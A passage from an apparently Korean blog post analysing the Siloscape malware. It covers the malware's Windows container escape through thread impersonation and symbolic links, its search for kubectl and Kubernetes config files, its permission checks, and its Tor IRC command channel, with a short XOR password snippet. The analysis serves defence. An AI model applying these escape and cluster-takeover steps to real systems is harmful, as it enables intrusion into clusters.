&#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xC5D0; &#xC811;&#xADFC;</li><li>Windows container escape&#xB97C; &#xD1B5;&#xD574; &#xCEE8;&#xD14C;&#xC774;&#xB108;&#xB97C; escape &#xD558;&#xACE0; underlying node&#xC5D0;&#xC11C; &#xCF54;&#xB4DC;&#xB97C; &#xC2E4;&#xD589;</li><li>node&#xC758; &#xC790;&#xACA9; &#xC99D;&#xBA85;&#xC744; &#xD1B5;&#xD574; &#xD074;&#xB7EC;&#xC2A4;&#xD130;&#xC5D0; &#xC804;&#xD30C;&#xB97C; &#xC2DC;&#xB3C4;</li><li>&#xD1A0;&#xB974; &#xB124;&#xD2B8;&#xC6CC;&#xD06C;&#xB97C; &#xD1B5;&#xD574; IRC &#xD504;&#xB85C;&#xD1A0;&#xCF5C;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; C2 &#xC11C;&#xBC84;&#xC5D0; &#xC811;&#xC18D;</li><li>&#xCD94;&#xAC00; command &#xB300;&#xAE30;</li><li></li></ul><p>&#xC774; &#xC545;&#xC131;&#xCF54;&#xB4DC;&#xB294; Kubernetes cluster&#xC758; &#xCEF4;&#xD4E8;&#xD305; &#xB9AC;&#xC18C;&#xC2A4;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xC554;&#xD638;&#xD654;&#xD3D0; &#xCC44;&#xAD74;&#xC744; &#xC218;&#xD589;&#xD558;&#xACE0; &#xC190;&#xC0C1;&#xB41C; &#xD074;&#xB7EC;&#xC2A4;&#xD130;&#xC5D0;&#xC11C; &#xC2E4;&#xD589;&#xB418;&#xB294; &#xC218;&#xBC31; &#xAC1C;&#xC758; &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xC758; &#xC911;&#xC694; &#xB370;&#xC774;&#xD130;&#xB97C; &#xAC00;&#xC838;&#xC62C; &#xC218; &#xC788;&#xB2E4;.</p><p>C2 &#xC11C;&#xBC84;&#xB97C; &#xC870;&#xC0AC;&#xD55C; &#xACB0;&#xACFC; &#xC774; &#xC545;&#xC131;&#xCF54;&#xB4DC;&#xB294; &#xD070; &#xB124;&#xD2B8;&#xC6CC;&#xD06C;&#xC758; &#xC77C;&#xBD80;&#xBD84;&#xC774;&#xBA70; &#xC774; &#xCEA0;&#xD398;&#xC778;&#xC740; 1&#xB144; &#xC774;&#xC0C1; &#xC9C4;&#xD589;&#xB410;&#xB2E4;. &#xAC8C;&#xB2E4;&#xAC00; &#xCEA0;&#xD398;&#xC778;&#xC758; &#xD2B9;&#xC815; &#xBD80;&#xBD84;&#xC774; &#xC544;&#xC9C1; &#xD65C;&#xC131;&#xD654;&#xB418;&#xC5B4;&#xC788;&#xB2E4;.</p><h1 id="&#xAE30;&#xC220;-&#xAC1C;&#xC694;"><a href="#&#xAE30;&#xC220;-&#xAC1C;&#xC694;" class="headerlink" title="&#xAE30;&#xC220; &#xAC1C;&#xC694;"></a>&#xAE30;&#xC220; &#xAC1C;&#xC694;</h1><p>Siloscape&#xC758; &#xC790;&#xC138;&#xD55C; &#xAE30;&#xC220;&#xC744; &#xC0B4;&#xD3B4;&#xBCF4;&#xAE30; &#xC804;&#xC5D0; &#xC804;&#xBC18;&#xC801;&#xC778; &#xD589;&#xC704;&#xB97C; &#xC0B4;&#xD3B4;&#xBCF4;&#xC790;.</p><p><img src="/2021/06/20/idioth/siloscape/Untitled.png" alt></p><ol><li>&#xD574;&#xCEE4;&#xB294; 1-day &#xCDE8;&#xC57D;&#xC810;&#xC774;&#xB098; &#xC6F9;&#xD398;&#xC774;&#xC9C0;, &#xB370;&#xC774;&#xD130;&#xBCA0;&#xC774;&#xC2A4; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; Windows container &#xB0B4;&#xBD80;&#xC5D0; &#xC6D0;&#xACA9; &#xCF54;&#xB4DC; &#xC2E4;&#xD589; (Remote Code Execution, RCE)&#xC744; &#xC218;&#xD589;</li><li>Siloscape (<code>CloudMalware.exe</code>)&#xB97C; C2 &#xC811;&#xC18D; &#xC815;&#xBCF4;&#xC640; &#xD568;&#xAED8; command line&#xC73C;&#xB85C; &#xC2E4;&#xD589;</li><li>Siloscape&#xB294; <code>SeTcbPrivilege</code> &#xAD8C;&#xD55C;&#xC744; &#xC5BB;&#xAE30; &#xC704;&#xD574; <code>CExecSvc.exe</code>&#xB97C; impersonate (<a href="https://unit42.paloaltonetworks.com/windows-server-containers-vulnerabilities/">&#xD574;&#xB2F9; &#xAC8C;&#xC2DC;&#xAE00;</a>&#xC5D0;&#xC11C; &#xAE30;&#xC220; &#xC0C1;&#xC138; &#xB0B4;&#xC6A9; &#xD655;&#xC778; &#xAC00;&#xB2A5;)</li><li>&#xD638;&#xC2A4;&#xD2B8;&#xC5D0; global symbolic link&#xB97C; &#xC0DD;&#xC131;&#xD558;&#xACE0; &#xCEE8;&#xD14C;&#xC774;&#xB108;&#xD654; &#xB41C; X &#xB4DC;&#xB77C;&#xC774;&#xBE0C;&#xB97C; &#xD638;&#xC2A4;&#xD2B8;&#xC758; C &#xB4DC;&#xB77C;&#xC774;&#xBE0C;&#xC5D0; &#xC5F0;&#xACB0;</li><li>global link&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xD638;&#xC2A4;&#xD2B8;&#xC5D0;&#xC11C; &#xC774;&#xB984;&#xC73C;&#xB85C; <code>kubectl.exe</code>&#xB97C; &#xCC3E;&#xACE0; &#xC815;&#xADDC;&#xC2DD;&#xC73C;&#xB85C; Kubernetes &#xC124;&#xC815; &#xD30C;&#xC77C;&#xC744; &#xCC3E;&#xC74C;</li><li>&#xC190;&#xC0C1;&#xB41C; &#xB178;&#xB4DC;&#xAC00; &#xC0C8;&#xB85C;&#xC6B4; Kubernetes deployments&#xB97C; &#xC0DD;&#xC131;&#xD560; &#xC218; &#xC788;&#xB294; &#xAD8C;&#xD55C;&#xC774; &#xCDA9;&#xBD84;&#xD55C;&#xC9C0; &#xD655;&#xC778;</li><li>unzip&#xC744; &#xC0AC;&#xC6A9;&#xD574; &#xC555;&#xCD95; &#xD30C;&#xC77C;&#xC5D0;&#xC11C; &#xD1A0;&#xB974; &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xB97C; &#xB514;&#xC2A4;&#xD06C;&#xB85C; &#xCD94;&#xCD9C; (Siloscape&#xC758; main binary&#xC5D0; &#xD30C;&#xC77C;&#xC774; &#xC555;&#xCD95;&#xB418;&#xC5B4; &#xC788;&#xC74C;)</li><li>&#xD1A0;&#xB974; &#xB124;&#xD2B8;&#xC6CC;&#xD06C;&#xC5D0; &#xC5F0;&#xACB0;</li><li>command line argument&#xB97C; &#xD1B5;&#xD574; C2 &#xC11C;&#xBC84;&#xC758; &#xBE44;&#xBC00;&#xBC88;&#xD638;&#xB97C; &#xC554;&#xD638;&#xD654;</li><li><code>.onion</code> &#xB3C4;&#xBA54;&#xC778;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; C2 &#xC11C;&#xBC84;&#xC5D0; &#xC5F0;&#xACB0;</li><li>C2 &#xC11C;&#xBC84;&#xC5D0;&#xC11C; &#xC624;&#xB294; &#xBA85;&#xB839;&#xC744; &#xAE30;&#xB2E4;&#xB9AC;&#xACE0;, &#xBA85;&#xB839;&#xC774; &#xC62C; &#xACBD;&#xC6B0; &#xC2E4;&#xD589;</li></ol><p>&#xCEE8;&#xD14C;&#xC774;&#xB108;&#xB97C; &#xD0C0;&#xAE43;&#xC73C;&#xB85C; &#xD55C; &#xB2E4;&#xB978; &#xC554;&#xD638;&#xD654;&#xD3D0; &#xCC44;&#xAD74;&#xC774; &#xC8FC; &#xBAA9;&#xC801;&#xC778; &#xC545;&#xC131;&#xCF54;&#xB4DC;&#xB4E4;&#xACFC; &#xB2E4;&#xB974;&#xAC8C; Siloscape&#xB294; &#xD074;&#xB7EC;&#xC2A4;&#xD130;&#xB97C; &#xC190;&#xC0C1;&#xC2DC;&#xD0A4;&#xC9C0; &#xC54A;&#xB294;&#xB2E4;. &#xB300;&#xC2E0;&#xC5D0; &#xD0D0;&#xC9C0; &#xBC0F; &#xCD94;&#xC801;&#xC744; &#xBC29;&#xC9C0;&#xD558;&#xACE0; &#xD074;&#xB7EC;&#xC2A4;&#xD130;&#xC5D0; &#xBC31;&#xB3C4;&#xC5B4;&#xB97C; &#xC124;&#xCE58;&#xD558;&#xB294; &#xB370;&#xC5D0; &#xC9D1;&#xC911;&#xD588;&#xB2E4;.</p><h1 id="Defense-&#xC6B0;&#xD68C;&#xC640;-&#xB09C;&#xB3C5;&#xD654;"><a href="#Defense-&#xC6B0;&#xD68C;&#xC640;-&#xB09C;&#xB3C5;&#xD654;" class="headerlink" title="Defense &#xC6B0;&#xD68C;&#xC640; &#xB09C;&#xB3C5;&#xD654;"></a>Defense &#xC6B0;&#xD68C;&#xC640; &#xB09C;&#xB3C5;&#xD654;</h1><p>Siloscape&#xB294; &#xC2EC;&#xD558;&#xAC8C; &#xB09C;&#xB3C5;&#xD654;&#xB418;&#xC5B4; &#xC788;&#xC73C;&#xBA70; &#xB300;&#xBD80;&#xBD84;&#xC758; &#xBB38;&#xC790;&#xC5F4;&#xC744; &#xC77D;&#xC744; &#xC218; &#xC5C6;&#xB2E4;. &#xB09C;&#xB3C5;&#xD654; &#xB85C;&#xC9C1;&#xC740; &#xC5B4;&#xB835;&#xC9C0; &#xC54A;&#xC9C0;&#xB9CC; &#xB9AC;&#xBC84;&#xC2F1; &#xD558;&#xAE30; &#xB108;&#xBB34; &#xD798;&#xB4E4;&#xB2E4;.</p><p><img src="/2021/06/20/idioth/siloscape/Untitled%201.png" alt></p><p>&#xB2E8;&#xC21C;&#xD55C; API &#xD638;&#xCD9C;&#xB3C4; &#xB09C;&#xB3C5;&#xD654; &#xB418;&#xC5B4;&#xC788;&#xC73C;&#xBA70; &#xD568;&#xC218;&#xB97C; &#xB2E8;&#xC21C;&#xD558;&#xAC8C; &#xD638;&#xCD9C;&#xD558;&#xC9C0; &#xC54A;&#xACE0; Native API (NTAPI)&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC600;&#xB2E4;.</p><p><img src="/2021/06/20/idioth/siloscape/Untitled%202.png" alt></p><p>&#xC608;&#xC2DC;&#xB85C; <code>CreateFile</code>&#xC744; &#xD638;&#xCD9C;&#xD558;&#xB294; &#xB300;&#xC2E0;&#xC5D0; <code>NtCreateFile</code>&#xC744; &#xD638;&#xCD9C;&#xD55C;&#xB2E4;. <code>NtCreateFile</code>&#xC744; &#xC9C1;&#xC811; &#xD638;&#xCD9C;&#xD558;&#xB294; &#xB300;&#xC2E0;&#xC5D0; &#xB7F0;&#xD0C0;&#xC784;&#xC5D0;&#xC11C; <code>ntdll.dll</code>&#xC5D0;&#xC11C; &#xD568;&#xC218; &#xC774;&#xB984;&#xC744; &#xCC3E;&#xC544; &#xC8FC;&#xC18C;&#xB85C; &#xC810;&#xD504;&#xD558;&#xC5EC; &#xD638;&#xCD9C;&#xD55C;&#xB2E4;. &#xADF8;&#xBFD0;&#xB9CC; &#xC544;&#xB2C8;&#xB77C; &#xD568;&#xC218;&#xC640; &#xBAA8;&#xB4C8; &#xC774;&#xB984;&#xC744; &#xB09C;&#xB3C5;&#xD654;&#xD558;&#xACE0; &#xB7F0;&#xD0C0;&#xC784;&#xC5D0;&#xC11C; &#xBCF5;&#xD638;&#xD654;&#xD55C;&#xB2E4;. &#xC815;&#xC801; &#xBD84;&#xC11D;&#xC73C;&#xB85C;&#xB294; &#xBD84;&#xC11D;&#xD558;&#xAE30; &#xC5B4;&#xB835;&#xACE0; &#xB9AC;&#xBC84;&#xC2A4; &#xC5D4;&#xC9C0;&#xB2C8;&#xC5B4;&#xB9C1; &#xD558;&#xB294;&#xB370; &#xD798;&#xB4E0; &#xC545;&#xC131;&#xCF54;&#xB4DC;&#xC774;&#xB2E4;.</p><p>Siloscape&#xB294; &#xD55C; &#xC30D;&#xC758; key&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; C2 &#xC11C;&#xBC84;&#xC758; &#xBE44;&#xBC00;&#xBC88;&#xD638;&#xB97C; &#xBCF5;&#xD638;&#xD654;&#xD55C;&#xB2E4;. &#xB09C;&#xB3C5;&#xD654; &#xC911;&#xC5D0;&#xC11C; &#xAC00;&#xC7A5; &#xC911;&#xC694;&#xD55C; &#xD2B9;&#xC9D5;&#xC740; &#xD0A4; &#xD558;&#xB098;&#xB294; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xC5D0; &#xD558;&#xB4DC; &#xCF54;&#xB529;&#xB418;&#xC5B4; &#xC788;&#xB294;&#xB370;, &#xD558;&#xB098;&#xB294; command line argument&#xC5D0;&#xC11C; &#xC81C;&#xACF5;&#xB41C;&#xB2E4;&#xB294; &#xC810;&#xC774;&#xB2E4;. AutoFocus&#xC640; VirusTotal &#xAC19;&#xC740; &#xC5EC;&#xB7EC; &#xC5D4;&#xC9C4;&#xC5D0;&#xC11C; hash&#xB97C; &#xAC80;&#xC0C9;&#xD574;&#xB3C4; &#xACB0;&#xACFC;&#xB97C; &#xCC3E;&#xC744; &#xC218; &#xC5C6;&#xC5C8;&#xB2E4;. &#xC774;&#xB97C; &#xD1B5;&#xD574; Siloscape&#xB294; &#xC0C8;&#xB85C;&#xC6B4; &#xACF5;&#xACA9;&#xC744; &#xD560; &#xB54C; &#xACE0;&#xC720;&#xD55C; &#xD0A4;&#xB97C; &#xC0AC;&#xC6A9;&#xD574;&#xC11C; &#xCEF4;&#xD30C;&#xC77C;&#xC744; &#xD558;&#xB294; &#xAC83;&#xC744; &#xC720;&#xCD94;&#xD560; &#xC218; &#xC788;&#xB2E4;. &#xD558;&#xB4DC; &#xCF54;&#xB529;&#xB41C; &#xD0A4;&#xB294; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xB4E4;&#xC744; &#xC0B4;&#xC9DD;&#xC529; &#xB2E4;&#xB974;&#xAC8C; &#xB9CC;&#xB4E4;&#xC5B4;&#xC11C; hash&#xB97C; &#xD1B5;&#xD574; &#xCC3E;&#xC744; &#xC218; &#xC5C6;&#xC74C;&#xC744; &#xC124;&#xBA85;&#xD55C;&#xB2E4;. &#xB610; hash&#xB9CC;&#xC73C;&#xB85C; Siloscape&#xB97C; &#xD0D0;&#xC9C0;&#xD560; &#xC218; &#xC5C6;&#xB2E4;.</p><p><img src="/2021/06/20/idioth/siloscape/Untitled%203.png" alt></p><p>&#xB2E4;&#xB978; &#xD765;&#xBBF8;&#xB85C;&#xC6B4; &#xD2B9;&#xC9D5;&#xC740; Visual Studio&#xC758; Resource Manager&#xB97C; &#xC0AC;&#xC6A9;&#xD55C; &#xAC83;&#xC774;&#xB2E4;. Visual Studio&#xC5D0; &#xB0B4;&#xC7A5;&#xB41C; &#xAE30;&#xB2A5;&#xC73C;&#xB85C; &#xC5B4;&#xB5A4; &#xD30C;&#xC77C;&#xC774;&#xB4E0; &#xC6D0;&#xBCF8; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xC5D0; &#xCD94;&#xAC00;&#xD560; &#xC218; &#xC788;&#xACE0; &#xAC04;&#xB2E8;&#xD55C; API &#xD638;&#xCD9C;&#xC744; &#xD1B5;&#xD574; &#xD3EC;&#xC778;&#xD130;&#xB97C; &#xC5BB;&#xC744; &#xC218; &#xC788;&#xB2E4;. Siloscape&#xB294; &#xB514;&#xC2A4;&#xD06C;&#xC5D0; &#xD1A0;&#xB974; &#xC544;&#xCE74;&#xC774;&#xBE0C;&#xC640; &#xC544;&#xCE74;&#xC774;&#xBE0C;&#xB97C; &#xC5F4;&#xAE30; &#xC704;&#xD574; &#xC0AC;&#xC6A9;&#xB418;&#xB294; unzip &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xB97C; &#xC774;&#xB97C; &#xD1B5;&#xD574; &#xCD94;&#xAC00;&#xD588;&#xB2E4;. &#xB610;&#xD55C; &#xD1A0;&#xB974;&#xB97C; &#xD1B5;&#xD574; C2 &#xC11C;&#xBC84;&#xC5D0; &#xC548;&#xC804;&#xD558;&#xAC8C; &#xC811;&#xC18D;&#xD55C;&#xB2E4;.</p><h1 id="The-Container-Escape"><a href="#The-Container-Escape" class="headerlink" title="The Container Escape"></a>The Container Escape</h1><p>Siloscape&#xC758; &#xD765;&#xBBF8;&#xB85C;&#xC6B4; &#xC810; &#xC911; &#xD558;&#xB098;&#xB294; &#xCEE8;&#xD14C;&#xC774;&#xB108;&#xB97C; escape &#xD558;&#xB294; &#xAC83;&#xC774;&#xB2E4;. escape&#xB97C; &#xD558;&#xAE30; &#xC704;&#xD574; system call <code>NtSetInformationSymbolicLink</code>&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xB824;&#xBA74; <code>SeTcbPrivilege</code> &#xAD8C;&#xD55C;&#xC744; &#xC5BB;&#xC5B4;&#xC57C; &#xD55C;&#xB2E4;. &#xC5EC;&#xAE30;&#xC5D0;&#xB294; &#xBA87; &#xAC00;&#xC9C0; &#xBC29;&#xBC95;&#xC774; &#xC788;&#xB2E4;. &#xC608;&#xB97C; &#xB4E4;&#xC5B4; &#xAD8C;&#xD55C;&#xC744; &#xAC00;&#xC9C4; <code>CExecSvc.exe</code>&#xC5D0; DLL&#xC744; inject &#xD558;&#xACE0; &#xADF8; context&#xC5D0;&#xC11C; <code>NtSetInformationSymbolicLink</code>&#xB97C; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC788;&#xB2E4;. &#xD558;&#xC9C0;&#xB9CC; Siloscape&#xB294; &#xAE30;&#xC220; &#xBB38;&#xC11C;&#xB098; &#xC608;&#xC2DC;&#xAC00; &#xAC70;&#xC758; &#xC5C6;&#xB294; Thread Impersonation&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xC600;&#xB2E4;. &#xC774; &#xAE30;&#xC220;&#xC758; &#xC8FC;&#xC694;&#xD55C; &#xD568;&#xC218;&#xB294; &#xBB38;&#xC11C;&#xD654;&#xB418;&#xC9C0; &#xC54A;&#xC740; system call <code>NtImpersonateThread</code>&#xC774;&#xB2E4;.</p><p>Siloscape&#xB294; main thread&#xB97C; impersonating &#xD558;&#xC5EC; <code>CExecSvc.exe</code>&#xC758; &#xAD8C;&#xD55C;&#xC744; &#xBAA8;&#xBC29;&#xD558;&#xACE0; &#xCEE8;&#xD14C;&#xC774;&#xB108;&#xB97C; &#xAE68;&#xAE30; &#xC704;&#xD574; &#xC0C8;&#xB85C; &#xC0DD;&#xC131;&#xB41C; symbolic link&#xC5D0;&#xC11C; <code>NtSetInformationSymbolicLink</code>&#xB97C; &#xD638;&#xCD9C;&#xD55C;&#xB2E4;. &#xAD6C;&#xCCB4;&#xC801;&#xC73C;&#xB85C; &#xCEE8;&#xD14C;&#xC774;&#xB108;&#xD654; &#xB41C; X &#xB4DC;&#xB77C;&#xC774;&#xBE0C;&#xB97C; &#xD638;&#xC2A4;&#xD2B8;&#xC758; C &#xB4DC;&#xB77C;&#xC774;&#xBE0C;&#xC5D0; &#xC5F0;&#xACB0;&#xD55C;&#xB2E4;.</p><h1 id="&#xD074;&#xB7EC;&#xC2A4;&#xD130;-&#xC120;&#xD0DD;"><a href="#&#xD074;&#xB7EC;&#xC2A4;&#xD130;-&#xC120;&#xD0DD;" class="headerlink" title="&#xD074;&#xB7EC;&#xC2A4;&#xD130; &#xC120;&#xD0DD;"></a>&#xD074;&#xB7EC;&#xC2A4;&#xD130; &#xC120;&#xD0DD;</h1><p>&#xD638;&#xC2A4;&#xD2B8;&#xC5D0; link&#xB97C; &#xC0DD;&#xC131;&#xD55C; &#xB4A4;&#xC5D0; Kubernetes &#xB178;&#xB4DC;&#xC5D0; &#xC874;&#xC7AC;&#xD558;&#xB294; <code>kubectl.exe</code>&#xC640; Kubernetes &#xC124;&#xC815; &#xD30C;&#xC77C;&#xC744; &#xCC3E;&#xB294;&#xB2E4;.</p><p><img src="/2021/06/20/idioth/siloscape/Untitled%204.png" alt></p><p>&#xC774;&#xB984;&#xC744; &#xD1B5;&#xD574; <code>kubectl.exe</code>&#xB97C; &#xCC3E;&#xACE0; &#xC815;&#xADDC;&#xC2DD;&#xC744; &#xC0AC;&#xC6A9;&#xD574; Kubernetes &#xC124;&#xC815; &#xD30C;&#xC77C;&#xC744; &#xCC3E;&#xB294;&#xB2E4;. &#xAC80;&#xC0C9;&#xD558;&#xB294; &#xD568;&#xC218;&#xB294; &#xAC80;&#xC0C9;&#xC744; &#xC548; &#xD560; &#xD3F4;&#xB354; &#xC774;&#xB984;&#xC774; &#xD3EC;&#xD568;&#xB41C; &#xBCA1;&#xD130;&#xC758; &#xD3EC;&#xC778;&#xD130;&#xB97C; &#xCD94;&#xAC00;&#xC801;&#xC778; &#xC778;&#xC218;&#xB85C; &#xC0AC;&#xC6A9;&#xD55C;&#xB2E4;.</p><p><img src="/2021/06/20/idioth/siloscape/Untitled%205.png" alt></p><p>&#xD30C;&#xC77C; &#xAC80;&#xC0C9;&#xC744; &#xC704;&#xD574; <code>FindFile</code>&#xC744; &#xD638;&#xCD9C;&#xD560; &#xB54C; &#xAC80;&#xC0C9; &#xC18D;&#xB3C4;&#xB97C; &#xBE60;&#xB974;&#xAC8C; &#xD558;&#xAE30; &#xC704;&#xD574; <code>Program Files</code>, <code>Program Files (x86)</code>, <code>Windows</code>, <code>Users</code> &#xD3F4;&#xB354;&#xB97C; &#xC81C;&#xC678;&#xD55C;&#xB2E4;. (&#xD574;&#xB2F9; &#xD3F4;&#xB354;&#xC5D0; &#xD30C;&#xC77C;&#xC774; &#xC874;&#xC7AC;&#xD558;&#xC9C0; &#xC54A;&#xC744; &#xAC00;&#xB2A5;&#xC131;&#xC774; &#xB192;&#xC73C;&#xBBC0;&#xB85C;) &#xB450; &#xD30C;&#xC77C;&#xC744; &#xBAA8;&#xB450; &#xCC3E;&#xC73C;&#xBA74; &#xC804;&#xC5ED; &#xBCC0;&#xC218;&#xC5D0; &#xACBD;&#xB85C;&#xAC00; &#xC800;&#xC7A5;&#xB41C;&#xB2E4;. &#xD30C;&#xC77C;&#xC774; &#xC5C6;&#xC73C;&#xBA74; &#xACF5;&#xACA9;&#xC744; &#xBA48;&#xCD94;&#xACE0; siloscape&#xAC00; &#xC885;&#xB8CC;&#xB41C;&#xB2E4;.</p><p><code>kubectl</code>&#xC744; &#xC2E4;&#xD589;&#xD558;&#xB294;&#xB370; &#xD544;&#xC694;&#xD55C; &#xAC78; &#xBAA8;&#xB450; &#xCC3E;&#xC740; &#xB2E4;&#xC74C; <code>%ls auth can-i create deployments --kubeconfig=%ls</code> &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xD1B5;&#xD574; &#xC190;&#xC0C1;&#xB41C; &#xB178;&#xB4DC;&#xAC00; &#xC545;&#xC131; &#xD589;&#xC704;&#xB97C; &#xD560; &#xC218; &#xC788;&#xB294; &#xAD8C;&#xD55C;&#xC774; &#xC788;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD55C;&#xB2E4;. </p><h1 id="C2-&#xC5F0;&#xACB0;-&#xBC0F;-&#xC9C0;&#xC6D0;-&#xBA85;&#xB839;&#xC5B4;"><a href="#C2-&#xC5F0;&#xACB0;-&#xBC0F;-&#xC9C0;&#xC6D0;-&#xBA85;&#xB839;&#xC5B4;" class="headerlink" title="C2 &#xC5F0;&#xACB0; &#xBC0F; &#xC9C0;&#xC6D0; &#xBA85;&#xB839;&#xC5B4;"></a>C2 &#xC5F0;&#xACB0; &#xBC0F; &#xC9C0;&#xC6D0; &#xBA85;&#xB839;&#xC5B4;</h1><p>&#xC190;&#xC0C1;&#xB41C; &#xB178;&#xB4DC;&#xAC00; &#xC0C8;&#xB85C;&#xC6B4; deployments&#xB97C; &#xC0DD;&#xC131;&#xD560; &#xC218; &#xC788;&#xC73C;&#xBA74; &#xD638;&#xC2A4;&#xD2B8;&#xC758; C &#xB4DC;&#xB77C;&#xC774;&#xBE0C;&#xC5D0; &#xD1A0;&#xB974; &#xC544;&#xCE74;&#xC774;&#xBE0C;&#xC640; unzip &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xB97C; &#xCD94;&#xCD9C;&#xD55C;&#xB2E4;. &#xD1A0;&#xB974;&#xB97C; &#xCD94;&#xCD9C;&#xD55C; &#xD6C4; <code>tor.exe</code>&#xB97C; &#xC0C8; &#xC2A4;&#xB808;&#xB4DC;&#xB85C; &#xC2DC;&#xC791;&#xD558;&#xACE0; &#xD1A0;&#xB974; &#xC2A4;&#xB808;&#xB4DC;&#xC758; output&#xC744; &#xD655;&#xC778;&#xD560; &#xB54C;&#xAE4C;&#xC9C0; &#xB300;&#xAE30;&#xD55C;&#xB2E4;.</p><p>&#xD1A0;&#xB974;&#xAC00; &#xC2E4;&#xD589;&#xB418;&#xBA74; <code>.onion</code> &#xB3C4;&#xBA54;&#xC778;&#xC744; &#xD1B5;&#xD574; IRC &#xC11C;&#xBC84;&#xC778; C2&#xC5D0; &#xC5F0;&#xACB0;&#xD55C;&#xB2E4;.</p><p>&#xC11C;&#xBC84;&#xB294; &#xBE44;&#xBC00;&#xBC88;&#xD638;&#xB85C; &#xBCF4;&#xD638;&#xB418;&#xACE0; &#xC788;&#xACE0; command line argument&#xC640; &#xBC14;&#xC774;&#xD2B8; XOR&#xC744; &#xD1B5;&#xD574; &#xBCF5;&#xD638;&#xD654;&#xD55C;&#xB2E4;. C2 &#xC11C;&#xBC84;&#xC758; &#xBCF5;&#xD638;&#xD654; &#xB85C;&#xC9C1;&#xC744; &#xAC04;&#xB2E8;&#xD558;&#xAC8C; &#xD45C;&#xD604;&#xD558;&#xBA74; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xB2E4;.</p><pre><code class="hljs angelscript">char hardCodedXor[<span class="hljs-number">32</span>] = <span class="hljs-string">&quot;HARD_CODED_32_LONG_STRING&quot;</span>;char ircPass[<span class="hljs-number">32</span>] = { <span class="hljs-number">0</span> };<span class="hljs-keyword">for</span> (<span class="hljs-built_in">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">32</span>; i++)     ircPass[i] = hardCodedXor[i] ^ argv[<span class="hljs-number">1</span>][i];</code></pre><p>IRC &#xC11C;&#xBC84;&#xC5D0; &#xC5F0;&#xACB0;&#xC774; &#xC131;&#xACF5;&#xD558;&#xBA74; <code>JOIN #WindowsKubernetes</code> &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; <code>WindowsKubernetes</code> IRC &#xCC44;&#xB110;&#xC5D0; &#xB4E4;&#xC5B4;&#xAC04; &#xD6C4; &#xB300;&#xAE30;&#xD55C;&#xB2E4;.</p><p>Siloscape&#xB294; kubectl &#xC9C0;&#xC6D0; &#xBA85;&#xB839;&#xACFC; Windows <code>cmd</code> &#xBA85;&#xB839; &#xB450; &#xAC00;&#xC9C0; &#xC720;&#xD615;&#xC758; &#xBA85;&#xB839;&#xC774; &#xC788;&#xB2E4;.</p><p><img src="/2021/06/20/idioth/siloscape/Untitled%206.png" alt></p><p>&#xBA85;&#xB839;&#xC744; <code>admin</code> &#xC0AC;&#xC6A9;&#xC790;&#xAC00; &#xBC1B;&#xC73C;&#xBA74; &#xB2E4;&#xC74C; &#xB85C;&#xC9C1;&#xC744; &#xB530;&#xB978;&#xB2E4;.</p><ul><li>&#xBA54;&#xC2DC;&#xC9C0;&#xAC00; <code>K</code>&#xB85C; &#xC2DC;&#xC791;&#xD558;&#xBA74; <code>%ls %s --kubeconfig=%ls</code> &#xBA85;&#xB839;&#xC744; &#xC2E4;&#xD589;&#xD558;&#xC5EC; &#xC704;&#xC5D0;&#xC11C; &#xCC3E;&#xC740; &#xACBD;&#xB85C;&#xB85C; &#xD074;&#xB7EC;&#xC2A4;&#xD130;&#xC5D0; kubectl &#xBA85;&#xB839; &#xC2E4;&#xD589;<ul><li>&#xCCAB; &#xBC88;&#xC9F8; &#xD30C;&#xB77C;&#xBBF8;&#xD130; : &#xC804;&#xC5ED; &#xBCC0;&#xC218;&#xC758; kubectl&#xC758; &#xACBD;&#xB85C;</li><li>&#xB450; &#xBC88;&#xC9F8; &#xD30C;&#xB77C;&#xBBF8;&#xD130; : &#xCCAB;&#xBC88;&#xC9F8; &#xBB38;&#xC790;&#xB97C; &#xC81C;&#xC678;&#xD55C; admin&#xC73C;&#xB85C;&#xC758; &#xBA54;&#xC2DC;&#xC9C0;</li><li>&#xC138; &#xBC88;&#xC9F8; &#xD30C;&#xB77C;&#xBBF8;&#xD130; : &#xC804;&#xC5ED; &#xBCC0;&#xC218;&#xC758; &#xC124;&#xC815; &#xD30C;&#xC77C; &#xACBD;&#xB85C;</li></ul></li><li>&#xBA54;&#xC2DC;&#xC9C0;&#xAC00; <code>C</code>&#xB85C; &#xC2DC;&#xC791;&#xD558;&#xBA74; &#xCCAB; &#xBC88;&#xC9F8; &#xBB38;&#xC790;&#xB97C; &#xBE7C;&#xACE0; Windows cmd &#xBA85;&#xB839;&#xC744; &#xC2E4;&#xD589;</li></ul><h1 id="&#xACB0;&#xB860;"><a href="#&#xACB0;&#xB860;" class="headerlink" title="&#xACB0;&#xB860;"></a>&#xACB0;&#xB860;</h1><p>&#xB9AC;&#xC18C;&#xC2A4; &#xD558;&#xC774;&#xC7AC;&#xD0B9;&#xC774;&#xB098; DoS&#xB97C; &#xBAA9;&#xC801;&#xC73C;&#xB85C; &#xD55C; &#xB300;&#xBD80;&#xBD84;&#xC758; &#xD074;&#xB77C;&#xC6B0;&#xB4DC; &#xC545;&#xC131;&#xCF54;&#xB4DC;&#xC640; &#xB2EC;&#xB9AC; 